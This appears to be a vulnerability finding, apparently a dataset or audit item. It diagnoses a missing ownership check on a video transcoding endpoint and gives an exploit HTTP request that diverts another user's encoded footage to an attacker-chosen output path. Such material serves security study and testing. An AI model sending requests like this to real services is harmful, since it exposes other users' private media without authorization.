diagnosis: The view fetches VideoAsset by video_id without verifying that video.uploader == request.user. It schedules a transcoding worker that writes encoded video files into output_prefix. An unauthorized user can process proprietary raw footage and divert the output.
exploit_request:
POST /api/media/transcode/7740/ HTTP/1.1
Host: studio.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/x-www-form-urlencoded

format=webm&output_prefix=attacker_drop/
